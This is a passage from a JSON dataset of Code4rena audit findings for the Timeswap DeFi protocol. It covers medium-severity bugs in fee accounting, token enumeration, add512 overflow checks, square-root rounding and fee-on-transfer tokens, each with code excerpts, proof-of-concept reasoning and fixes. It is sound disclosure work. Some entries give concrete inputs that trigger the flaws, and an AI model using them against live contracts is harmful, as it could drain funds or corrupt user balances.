token1AndLong1Amount: token1AndLong1Amount,\n                shortAmount: shortAmount,\n                data: param.data\n            })\n        );\n\n        // check if the token0 balance target is achieved.\n        if (token0AndLong0Amount != 0) Error.checkEnough(IERC20(token0).balanceOf(address(this)), currentProcess.balance0Target);\n\n        // check if the token1 balance target is achieved.\n        if (token1AndLong1Amount != 0) Error.checkEnough(IERC20(token1).balanceOf(address(this)), currentProcess.balance1Target);\n\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L198-L244\n\n```solidity\n    function swap(TimeswapV2OptionSwapParam calldata param) external override noDelegateCall returns (uint256 token0AndLong0Amount, uint256 token1AndLong1Amount, bytes memory data) {\n        ...\n\n        Option storage option = options[param.strike][param.maturity];\n\n        // does main swap logic calculation\n        (token0AndLong0Amount, token1AndLong1Amount) = option.swap(param.strike, param.longTo, param.isLong0ToLong1, param.transaction, param.amount);\n\n        // update token0 and token1 balance target for any previous concurrent option transactions.\n        processing.updateProcess(token0AndLong0Amount, token1AndLong1Amount, !param.isLong0ToLong1, param.isLong0ToLong1);\n\n        // add a new process\n        // stores the token0 and token1 balance target required from the msg.sender to achieve.\n        Process storage currentProcess = (processing.push() = Process(\n            param.strike,\n            param.maturity,\n            param.isLong0ToLong1 ? IERC20(token0).balanceOf(address(this)) - token0AndLong0Amount : IERC20(token0).balanceOf(address(this)) + token0AndLong0Amount,\n            param.isLong0ToLong1 ? IERC20(token1).balanceOf(address(this)) + token1AndLong1Amount : IERC20(token1).balanceOf(address(this)) - token1AndLong1Amount\n        ));\n\n        // transfer token to recipient.\n        IERC20(param.isLong0ToLong1 ? token0 : token1).safeTransfer(param.tokenTo, param.isLong0ToLong1 ? token0AndLong0Amount : token1AndLong1Amount);\n\n        // ask the msg.sender to transfer token0 or token1 to this contract.\n        data = ITimeswapV2OptionSwapCallback(msg.sender).timeswapV2OptionSwapCallback(\n            TimeswapV2OptionSwapCallbackParam({\n                strike: param.strike,\n                maturity: param.maturity,\n                isLong0ToLong1: param.isLong0ToLong1,\n                token0AndLong0Amount: token0AndLong0Amount,\n                token1AndLong1Amount: token1AndLong1Amount,\n                data: param.data\n            })\n        );\n\n        // check if the token0 or token1 balance target is achieved.\n        Error.checkEnough(IERC20(param.isLong0ToLong1 ? token1 : token0).balanceOf(address(this)), param.isLong0ToLong1 ? currentProcess.balance1Target : currentProcess.balance0Target);\n\n        ...\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24910",
      "title": "[M-07] `Mint` function does not update `LiquidityPosition` state of caller before minting LP tokens. This",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302> \n\n<https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L60>\n\n### Impact\n\nWhen a LP mints V2 Pool tokens, `mint` function in [PoolLibrary](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302) gets called. Inside this function `updateDurationWeightBeforeMaturity` updates global `short`, `long0` and `long1` fee growth.\n\nChange in global fee growth necessitates an update to `LiquidityPosition` state of caller (specifically updating fees & fee growth rates) when there are state changes made to that position (in this case, increasing liquidity). This principle is followed in functions such as `burn`, `transferLiquidity`, `transferFees`. However when calling `mint`, this update is missing. As a result, `growth` & `fee` levels in liquidity position of caller are inconsistent with global fee growth rates.\n\nInconsistent state leads to incorrect calculations of long0/long1 and short fees of LP holders which in turn can lead to loss of fees. Since this impacts actual rewards for users, I've marked it as MEDIUM risk.\n\n### Proof of Concept\n\nLet's say, Bob has following sequence of events\n\n*   MINT at T0: Bob is a LP who mints N pool tokens at T0\n\n*   MINT at T1: Bob mints another M pool tokens at T1. At this point, had the protocol correctly updated fees before minting new pool tokens, Bob's fees & growth rate would be a function of current liquidity (N), global updated short fee growth rate at t1 (s_t1) and Bob's previous growth rate at t\\_0 (b_t0)\n\n*   BURN at T2: Bob burns N + M tokens at T2. At this point, Bob's fees should be a function of previous liquidity (N+M), global short fee growth rate (s_t2) and Bob's previous growth rate at t\\_1(b_t1) -> since this update never happened, Bob's previous growth rate is wrongly referenced b_t0 instead of b_t1.\n\nBob could collect a lower fees because of this state inconsistency.\n\n### Recommended Mitigation Steps\n\nUpdate the liquidity position state right before minting.\n\nAfter [line 302 of Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L302), update the LiquidityPosition by adding\n\n      liquidityPosition.update(pool.long0FeeGrowth, pool.long1FeeGrowth, pool.shortFeeGrowth);\n\n**[vhawk19 (Timeswap) confirmed](https://github.com/code-423n4/2023-01-timeswap-findings/issues/158)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue in the code of the 2023-01-timeswap project. The code in question is located in the Pool.sol and LiquidityPosition.sol files. The issue is that when a liquidity provider (LP) mints V2 Pool tokens, the code fails to update the LP's state, which can lead to incorrect calculations of long0/long1 and short fees of LP holders. This could result in the LP receiving lower fees than they should, leading to a potential loss of fees.\n\nThe bug was confirmed by vhawk19 (Timeswap). To mitigate the issue, the code should be updated to update the liquidity position state right before minting. This can be done by adding a line of code after line 302 of Pool.sol, which updates the LiquidityPosition with the pool's long0FeeGrowth, long1FeeGrowth, and shortFeeGrowth.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/158",
      "tags": [],
      "finders": [
        "0Kage"
      ]
    },
    {
      "id": "24909",
      "title": "[M-06] `_ownedTokensIndex` is SHARED by different owners, as a result, `_removeTokenFromAllTokensEnumeration` might remove the wrong tokenId.",
      "impact": "MEDIUM",
      "content": "\nThe data structure `_ownedTokensIndex` is SHARED by different owners, as a result, `_removeTokenFromAllTokensEnumeration()` might remove the wrong tokenId.\n\n### Proof of Concept\n\n`_ownedTokensIndex` is used to map from token ID to index of the owner tokens list, unfortunately, all owners share the same data structure at the same time (non-fungible tokens). So, the mapping for one owner might be overwritten by another owner when `_addTokenToOwnerEnumeration` is called: <br><https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/base/ERC1155Enumerable.sol#L116-L121>.\nAs a result,    `_removeTokenFromOwnerEnumeration()` might remove the wrong tokenID.\n\nRemoving the wrong tokenID can happen like the following:\n\n1.  Suppose Alice owns three tokens A, B, C with indices 1 -> A, 2->B, 3->C\n2.  Suppose Bob owns token D, 1->D, and will add A to his list via `_addTokenToOwnerEnumeration()`. As a result, we have 1->D, and 2-A, since `_ownedTokensIndex` is shared, we have A->2 in `_ownedTokensIndex`.\n3.  Next, `_removeTokenFromOwnerEnumeration()` is called to remove A from Alice. However, `tokenIndex` will be 2, which points to B, as a result, instead of deleting A, B is deleted from `_ownedTokens`. Wrong token delete!\n\n    function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {\n            uint256 lastTokenIndex = _currentIndex[from] - 1;\n            uint256 tokenIndex = _ownedTokensIndex[tokenId];\n\n            if (tokenIndex != lastTokenIndex) {\n                uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];\n\n                _ownedTokens[from][tokenIndex] = lastTokenId;\n                _ownedTokensIndex[lastTokenId] = tokenIndex;\n            }\n\n            delete _ownedTokensIndex[tokenId];\n            delete _ownedTokens[from][lastTokenIndex];\n        }\n\n### Tools Used\n\nRemix\n\n### Recommended Mitigation Steps\n\nRedefine `ownedTokensIndex` so that is is not shared:\n\n    mapping(address => mapping(uint256 => uint256)) private _ownedTokensIndex;\n\n**[vhawk19 (Timeswap) confirmed and commented](https://github.com/code-423n4/2023-01-timeswap-findings/issues/168#issuecomment-1434503390):**\n > Updated the [ERC1155Enumerable.sol](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/blob/devel/packages/v2-token/contracts/base/ERC1155Enumerable.sol) implementation, which should resolve these issues. \n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the data structure `_ownedTokensIndex` in the Timeswap project. This data structure is shared by different owners, and as a result, the `_removeTokenFromAllTokensEnumeration()` function might remove the wrong tokenId. This can happen when an owner adds a token to their list via `_addTokenToOwnerEnumeration()` and then `_removeTokenFromOwnerEnumeration()` is called to remove the token from the owner. Instead of deleting the token, the wrong tokenId is removed from the list. \n\nThe bug was tested using Remix, a web-based Ethereum IDE. To fix the bug, the `ownedTokensIndex` data structure should be redefined so that it is not shared. The Timeswap team has updated the `ERC1155Enumerable.sol` implementation, which should resolve this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/168",
      "tags": [],
      "finders": [
        "adriro",
        "chaduke"
      ]
    },
    {
      "id": "24908",
      "title": "[M-05] unexpected overflow for `FullMath.add512()` which can result in irregular behavior",
      "impact": "MEDIUM",
      "content": "\nThe vulnerability originates from insufficient checking in add512 function, where the AddOverflow revert gets bypassed, essentially the function assumes that an overflow only happens if (addendA1 > sum1), where in the case that it's possible for it to overflow in the case that addendA1 == sum1, which can be resulted through assigning a value that makes ( lt(sum0, addendA0) == 1 ) <=> sum0 < addendA0, which can only be achieved normally by overflowing the least significant addition. Then we can simply break the overflow check by assigning overflowing values which results in add(addendA1, addendB1) > type(256).max && addendA1 <= sum1, then we will manage to bypass the revert check and overflow the most significant part of add512 values.\n\nThe previous attack vector can lead to a manipulation in leverage and deleverage functions, in a way that it would result in more tokens for the user.\n\n### Proof of Concept\n\nInputting the following values results in an overflow:\n\nuint256 addendA0 = 1\n\nuint256 addendA1 = 100\n\nuint256 addendB0 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 (uint256 max value)\n\nuint256 addendB1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 (uint256 max value)\n\nresults in:\n\nsum0 = 0\n\nsum1 = 100\n\nThe expected behavior is to revert since, A1 + B1 result in a value that overflows, but instead consider it as a valid behavior due to the insufficient checking.\n\nAbstraction:\n\nA1 - A0\n\n\\+\n\nB1 - B0\n\n\\=\n\nS1 - S0\n\nS0 = A0 + B0\n\nS1 = A1 + B1 + ( if S0 overflows \\[+ 1])\n\nensure A1 <= S1\n\nrevert only on A1 > S1\n\nin the case of S0 overflows:\n\nS1 = A1 + B1 + 1\n\nrequire(A1 <= S1) is not most suited check, due to the fact that in the case of A1 == S1 check, it can still overflow if S1 = A1 + B1 + 1 overflows.\nwhich would bypass A1 > S1 revert check.\n\nThe major impact affects the `leverage()` and `deleverage()` results in values which are not expected.\n\n### Recommended Mitigation Steps\n\nAdd an equality check for if statement in add512 function.\n\n       function add512(uint256 addendA0, uint256 addendA1, uint256 addendB0, uint256 addendB1) public pure returns (uint256 sum0, uint256 sum1) {\n            assembly {\n                sum0 := add(addendA0, addendB0)\n                carry  := lt(sum0, addendA0)\n                sum1 := add(add(addendA1, addendB1), carry)\n            }\n            if (addendA1 > sum1 ||      ((sum1 == addendA1 || sum1 == addendB1) && (carry < addendA0 || carry < addendB0))\n    ) revert AddOverflow(addendA0, addendA1, addendB0, addendB1);\n    // \n        }\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-timeswap-findings/issues/182#issuecomment-1415339789):**\n > No explanation related to how this could lead to errors in `leverage` or `deleverage`.\n\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/182#issuecomment-1422675570):**\n > Fixed in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/270).\n\n***\n\n",
      "summary": "\nA bug was discovered in the add512 function of the Timeswap V2 Monorepo codebase. This function is responsible for adding two values and returning the sum. The bug was caused by insufficient checking in the add512 function. If an attacker inputs values that overflow the least significant addition, they can bypass the overflow check and overflow the most significant part of the add512 values. This can lead to manipulation in the leverage and deleverage functions, resulting in more tokens for the user.\n\nThe recommended mitigation steps are to add an equality check for the if statement in the add512 function. This was confirmed and resolved by Timeswap in a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/182",
      "tags": [],
      "finders": [
        "codeislight"
      ]
    },
    {
      "id": "24907",
      "title": "[M-04] sqrtDiscriminant can be calculated wrong",
      "impact": "MEDIUM",
      "content": "\nDue to the wrong calculation of short and long tokens during the `leverage` and `deleverage` process, the users can suffer financial loss while the protocol will lose fees.\n\n### Proof of Concept\n\nThe protocol uses `leverage` function to deposit short tokens and receive long tokens. On the opposite, `deleverage` function serves for depositing long tokens and receiving short tokens.\n\n[Leverage Function of TimeswapV2Pool contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L430-L466)\n\n[Deleverage Function of TimeswapV2Pool contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L377-L418)\n\nBoth functions call the PoolLibrary's `leverage` and `deleverage` functions after input sanitization.\n\n[Leverage Function of PoolLibrary contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L552-L655)\n\n[Deleverage Function of PoolLibrary contract](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L469-L539)\n\nPoolLibrary's `leverage` and `deleverage` functions update the state of the pool first for the fee growth and compute the `long0Amount`, `long1Amount`, and `shortAmount`. It also checks the transaction type according to the passed parameter types as per the `Transaction` contract's enum types below and calls `ConstantProduct`'s appropriate function accordingly;\n\n```solidity\n/// @dev The different kind of deleverage transactions.\nenum TimeswapV2PoolDeleverage {\n    GivenDeltaSqrtInterestRate,\n    GivenLong,\n    GivenShort,\n    GivenSum\n}\n\n/// @dev The different kind of leverage transactions.\nenum TimeswapV2PoolLeverage {\n    GivenDeltaSqrtInterestRate,\n    GivenLong,\n    GivenShort,\n    GivenSum\n}\n```\n\nIf the transaction type is  `GivenSum`, both `leverage` and `deleverage` functions of PoolLibrary call `ConstantProduct.updateGivenSumLong` for the sum amount of the long position in the base denomination to be withdrawn, and the short position to be deposited.\n\n```solidity\n\n} else if (param.transaction == TimeswapV2PoolDeleverage.GivenSum) {\n\t(pool.sqrtInterestRate, longAmount, shortAmount, shortFees) = ConstantProduct.updateGivenSumLong(\n...\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L516-L517)\n\n```solidity\n} else if (param.transaction == TimeswapV2PoolLeverage.GivenSum) {\n\t(pool.sqrtInterestRate, longAmount, shortAmount, ) = ConstantProduct.updateGivenSumLong(\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L602-L603)\n\n`updateGivenSumLong` updates the new square root interest rate given the sum of long positions in base denomination change and short position change;\n\n```solidity\n    function updateGivenSumLong(\n        uint160 liquidity,\n        uint160 rate,\n        uint256 sumAmount,\n        uint96 duration,\n        uint256 transactionFee,\n        bool isAdd\n    ) internal pure returns (uint160 newRate, uint256 longAmount, uint256 shortAmount, uint256 fees) {\n        uint256 amount = getShortOrLongFromGivenSum(liquidity, rate, sumAmount, duration, transactionFee, isAdd);\n\n        if (isAdd) (newRate, ) = getNewSqrtInterestRateGivenShort(liquidity, rate, amount, duration, false);\n        else newRate = getNewSqrtInterestRateGivenLong(liquidity, rate, amount, false);\n\n        fees = FeeCalculation.getFeesRemoval(amount, transactionFee);\n        amount -= fees;\n\n        if (isAdd) {\n            shortAmount = amount;\n            longAmount = sumAmount - shortAmount;\n        } else {\n            longAmount = amount;\n            shortAmount = sumAmount - longAmount;\n        }\n    }\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L230-L253)\n\nAnd `updateGivenSumLong` calls `getShortOrLongFromGivenSum` in order to return the `amount` which represents the short amount or long amount calculated.\n\n```solidity\n    function getShortOrLongFromGivenSum(uint160 liquidity, uint160 rate, uint256 sumAmount, uint96 duration, uint256 transactionFee, bool isShort) private pure returns (uint256 amount) {\n        uint256 negativeB = calculateNegativeB(liquidity, rate, sumAmount, duration, transactionFee, isShort);\n        uint256 sqrtDiscriminant = calculateSqrtDiscriminant(liquidity, rate, sumAmount, duration, transactionFee, negativeB, isShort);\n        amount = (negativeB - sqrtDiscriminant).shr(1, false);\n    }\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L356-L362)\n\nAnd the formula needs `sqrtDiscriminant` value to calculate the `amount` and it calls `calculateSqrtDiscriminant` [accordingly](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L395)\n\n`calculateSqrtDiscriminant` function performs a bunch of checks and carries out mathematical functions to return the SqrtDiscriminant by utilizing FullMath and Math libraries.\n\n```solidity\nsqrtDiscriminant = FullMath.sqrt512(b0, b1, true);\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L430)\n\nThe `sqrt` formula in the Math contract uses the modified version of [Babylonian Method](https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method) when flags are included.\n\n```solidity\n    function sqrt(uint256 value, bool roundUp) internal pure returns (uint256 result) { \n        if (value == type(uint256).max) return result = type(uint128).max;\n        if (value == 0) return 0;\n        unchecked {\n            uint256 estimate = (value + 1) >> 1;\n            result = value;\n            while (estimate < result) {\n                result = estimate;\n                estimate = (value / estimate + estimate) >> 1;\n            }\n        }\n\n        if (roundUp && value % result != 0) result++;\n    }\n```\n\n[Link](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/Math.sol#L69-L79)\n\nHowever, when the parameter `roundUp` is passed as `true`, this results in inconsistent behavior for different values. And it's being passed as true as can be seen [here](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/libraries/ConstantProduct.sol#L430)).\n\nIn order to show some examples let's pass the numbers as values and flag them true by using Math's `sqrt` function.\n\n| Values  | 1 | 2 | 3 | 4 | 5 | 6     | 7 | 8     | 9 | 10 | 11 | 12    | 13 | 14 | 15    | 16 | 17 | 18 | 19 | 20    | 21 | 22 | 23 | 24    | 25 | 26 | 27 | 28 | 29 | 30    |\n| ------- | - | - | - | - | - | ----- | - | ----- | - | -- | -- | ----- | -- | -- | ----- | -- | -- | -- | -- | ----- | -- | -- | -- | ----- | -- | -- | -- | -- | -- | ----- |\n| Results | 1 | 1 | 1 | 2 | 3 | **2** | 3 | **2** | 3 | 4  | 4  | **3** | 4  | 4  | **3** | 4  | 5  | 5  | 5  | **4** | 5  | 5  | 5  | **4** | 5  | 6  | 6  | 6  | 6  | **5** |\n\nAs can be seen from the table, the results are not distributed logically. And many times the result is steeply lesser than its neighbor results. (E.g Sqrt(6) ->2, Sqrt(15)->3 etc.)\n\nThe phenomenon occurs most if the values are small numbers.\n\nSo if the parameter  `value1` in `FullMath.sqrt512` is passed/calculated as zero value, it has a high chance of providing a wrong calculation as a result with the line below;\n\n```solidity\n    function sqrt512(uint256 value0, uint256 value1, bool roundUp) internal pure returns (uint256 result) {\n        if (value1 == 0) result = value0.sqrt(roundUp);\n```\n\nThis may lead to the wrong calculation of the `sqrtDiscriminant`, hence the wrong calculation of short or long amounts for the given transaction. The users might lose financial value due to this. Accordingly, the protocol might lose unspent fees as well.\n\nWhile the fewer values are affected more on this one, the pools with fewer token decimals and fewer token amounts are more affected by this error. As an example, a [Gemini Dollar](https://coinmarketcap.com/currencies/gemini-dollar/) pool (59th rank on CMC and having 2 decimals) would be subject to false returns.\n\n### Tools Used\n\nRemix, Excel\n\n### Recommended Mitigation Steps\n\nThe team might consider not using `true` flag for `Math.sqrt` function.\n\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/227#issuecomment-1422601119):**\n > Fixed in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/258).\n\n\n***\n\n",
      "summary": "\nThis bug report is about a wrong calculation of short and long tokens during the `leverage` and `deleverage` process in TimeswapV2Pool contract. This process is used to deposit short tokens and receive long tokens in the protocol. The wrong calculation is caused by the `updateGivenSumLong` function of PoolLibrary contract which calls the `ConstantProduct`'s appropriate function accordingly. The `ConstantProduct`'s function `updateGivenSumLong` calls `getShortOrLongFromGivenSum` in order to return the `amount` which represents the short amount or long amount calculated. The formula needs `sqrtDiscriminant` value to calculate the `amount` and it calls `calculateSqrtDiscriminant` accordingly. This function performs a bunch of checks and carries out mathematical functions to return the SqrtDiscriminant by utilizing FullMath and Math libraries. The Math contract uses the modified version of Babylonian Method when flags are included. However, when the parameter `roundUp` is passed as `true`, this results in inconsistent behavior for different values. This inconsistency causes the wrong calculation of short or long amounts for the given transaction. This can lead to financial loss for users and loss of fees for the protocol. This bug is more visible in pools with fewer token decimals and fewer token amounts.\n\nThe team might consider not using `true` flag for `Math.sqrt` function as the recommended mitigation step. This has been confirmed and resolved by vhawk19 (Timeswap) with the help of a PR.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/227",
      "tags": [],
      "finders": [
        "sorrynotsorry"
      ]
    },
    {
      "id": "24906",
      "title": "[M-03] Fee on transfer tokens will not behave as expected",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L145-L148> \n\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L235>\n\n### Impact\n\nAccording to [Whitepaper 1.1 Permissionless](https://github.com/code-423n4/2023-01-timeswap/blob/main/whitepaper.pdf):\n\n\"In Timeswap, liquidity providers can create pools for any ERC20 pair, without permission. It is designed to be generalized and works\nfor any pair of tokens, at any time frame, and at any market state ...\n\nIf fee on transfer token(s) is/are entailed, it will specifically make `mint()` and `swap()` revert in TimeswapV2Option.sol when checking if the token0 or token1 balance target is achieved.\n\n### Proof of Concept\n\n[File: TimeswapV2Option.sol#L144-L148](https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L144-L148)\n\n```solidity\n        // check if the token0 balance target is achieved.\n        if (token0AndLong0Amount != 0) Error.checkEnough(IERC20(token0).balanceOf(address(this)), currentProcess.balance0Target);\n\n        // check if the token1 balance target is achieved.\n        if (token1AndLong1Amount != 0) Error.checkEnough(IERC20(token1).balanceOf(address(this)), currentProcess.balance1Target);\n```\n\n[File: TimeswapV2Option.sol#L234-L235](https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L234-L235)\n\n```solidity\n        // check if the token0 or token1 balance target is achieved.\n        Error.checkEnough(IERC20(param.isLong0ToLong1 ? token1 : token0).balanceOf(address(this)), param.isLong0ToLong1 ? currentProcess.balance1Target : currentProcess.balance0Target);\n```\n\n[File: Error.sol#L148-L153](https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/Error.sol#L148-L153)\n\n```solidity\n    /// @dev Reverts when token amount not received.\n    /// @param balance The balance amount being subtracted.\n    /// @param balanceTarget The amount target.\n    function checkEnough(uint256 balance, uint256 balanceTarget) internal pure {\n        if (balance < balanceTarget) revert NotEnoughReceived(balance, balanceTarget);\n    }\n```\n\nAs can be seen from the code blocks above, `checkEnough()` is meant to be reverting when token amount has not been received. But in the case of deflationary tokens, the error is going to be thrown even though the token amount has been received due to the fee factor making `balance < balanceTarget`, i.e the contract balance of token0 and/or token1 always less than `currentProcess.balance0Target` or `currentProcess.balance1Target`.\n\n### Recommended Mitigation Steps\n\nConsider:\n\n1.  Whitelisting token0 and token1 ensuring no fee-on-transfer token is allowed when deploying a new Timeswap V2 Option pair contract, or\n2.  Calculating the balance before and after the [transfer to the recipient](https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L220) during the process, and use the difference between those two balances as the amount received rather than using the input amount (`token0AndLong0Amount` or `token1AndLong1Amount`) if deflationary token is going to be allowed in the protocol.\n\n**[vhawk19 (Timeswap) acknowledged and commented](https://github.com/code-423n4/2023-01-timeswap-findings/issues/247#issuecomment-1430795527):**\n > Not supported by design.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is related to the Timeswap protocol, which is a decentralized liquidity protocol for ERC20 pairs that allows liquidity providers to create pools without permission. According to the Whitepaper 1.1 Permissionless, the protocol is designed to work for any pair of tokens, at any time frame, and at any market state. \n\nThe bug is related to the transfer of tokens, where a fee is entailed. This fee is causing the `mint()` and `swap()` functions to revert in TimeswapV2Option.sol when checking if the token0 or token1 balance target is achieved. As can be seen from the code blocks provided, `checkEnough()` is meant to be reverting when token amount has not been received, but due to the fee factor, the contract balance of token0 and/or token1 is always less than `currentProcess.balance0Target` or `currentProcess.balance1Target`.\n\nThe recommended mitigation steps are: (1) whitelisting token0 and token1 to ensure no fee-on-transfer token is allowed when deploying a new Timeswap V2 Option pair contract, or (2) calculating the balance before and after the transfer to the recipient and using the difference between those two balances as the amount received rather than using the input amount if deflationary token is going to be allowed in the protocol. The Timeswap team has acknowledged the bug, but has stated that it is not supported by design.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/247",
      "tags": [],
      "finders": [
        "SaeedAlipoor01988",
        "rbserver",
        "Rolezn",
        "RaymondFam",
        "kaden",
        "nadin",
        "mert\\_eren",
        "pavankv"
      ]
    },
    {
      "id": "24905",
      "title": "[M-02] Burning a `ERC1155Enumerable` token doesn't remove it from the enumeration",
      "impact": "MEDIUM",
      "content": "\nThe `ERC1155Enumerable` base contract used in the `TimeswapV2Token` and `TimeswapV2LiquidityToken` tokens provides a functionality to enumerate all token ids that have been minted in the contract.\n\nThe logic to remove the token from the enumeration if the last token is burned is implemented in the `_afterTokenTransfer` hook:\n\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/base/ERC1155Enumerable.sol#L81-L101>\n\n```solidity\nfunction _afterTokenTransfer(address, address from, address to, uint256[] memory ids, uint256[] memory amounts, bytes memory) internal virtual override {\n    for (uint256 i; i < ids.length; ) {\n        if (amounts[i] != 0) _removeTokenEnumeration(from, to, ids[i], amounts[i]);\n\n        unchecked {\n            ++i;\n        }\n    }\n}\n\n/// @dev Remove token enumeration list if necessary.\n\nfunction _removeTokenEnumeration(address from, address to, uint256 id, uint256 amount) internal {\n    if (to == address(0)) {\n        if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n        _idTotalSupply[id] -= amount;\n    }\n\n    if (from != address(0) && from != to) {\n        if (balanceOf(from, id) == 0 && _additionalConditionRemoveTokenFromOwnerEnumeration(from, id)) _removeTokenFromOwnerEnumeration(from, id);\n    }\n}\n```\n\nThe `_removeTokenEnumeration` condition to check if the supply is 0 happens before the function decreases the burned amount. This will `_removeTokenFromAllTokensEnumeration` from being called when the last token(s) is(are) burned.\n\n### Impact\n\nThe token isn't removed from the enumeration since `_removeTokenFromAllTokensEnumeration` will never be called. This will cause the enumeration to always contain a minted token even though it is burned afterwards. The function `totalSupply` and `tokenByIndex` will report wrong values.\n\nThis will also cause the enumeration to contain duplicate values or multiple copies of the same token. If the token is minted again after all tokens were previously burned, the token will be re added to the enumeration.\n\n### Proof of Concept\n\nThe following test demonstrates the issue. Alice is minted a token and that token is then burned, the token is still present in the enumeration. The token is minted again, causing the enumeration to contain the token by duplicate.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity =0.8.8;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/base/ERC1155Enumerable.sol\";\n\ncontract TestERC1155Enumerable is ERC1155Enumerable {\n    constructor() ERC1155(\"\") {\n    }\n\n    function mint(address to, uint256 id, uint256 amount) external {\n        _mint(to, id, amount, 